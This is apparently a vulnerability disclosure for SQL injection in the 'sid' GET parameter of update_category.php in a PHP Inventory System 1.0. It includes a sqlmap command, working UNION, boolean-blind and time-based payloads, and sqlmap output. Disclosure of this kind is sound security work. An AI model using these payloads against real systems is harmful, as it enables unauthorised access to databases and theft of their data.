# SQL Injection in Inventory System (Update Category)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Category (`update_category.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_category.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (3 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_category.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_category.php?sid=20&table=category_details&return=view_category.php" \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/137.0.0.0 Safari/537.36" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-8172 UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7871,0x5373514845446e6d696f6267554278456b6654666f76454b4953546f724778746d477379464b7746,0x7178717171)-- -&table=category_details&return=view_category.php

```

**Boolean-based Blind Payload:**

```sql
sid=20 AND 9853=9853&table=category_details&return=view_category.php

```

**Time-based Blind Payload:**

```sql
sid=20 AND (SELECT 6130 FROM (SELECT(SLEEP(5)))lGiF)&table=category_details&return=view_category.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sid=20 AND 9853=9853&table=category_details&return=view_category.php
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=20 AND (SELECT 6130 FROM (SELECT(SLEEP(5)))lGiF)&table=category_details&return=view_category.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: sid=-8172 UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7871,0x5373514845446e6d696f6267554278456b6654666f76454b4953546f724778746d477379464b7746,0x7178717171)-- -&table=category_details&return=view_category.php
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1058" height="364" alt="图片" src="https://github.com/user-attachments/assets/53bd3952-cae9-4324-bccd-ccaebfc0207c" />
<img width="1014" height="453" alt="图片" src="https://github.com/user-attachments/assets/2dab2594-f515-49f0-889f-1f7b25464334" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
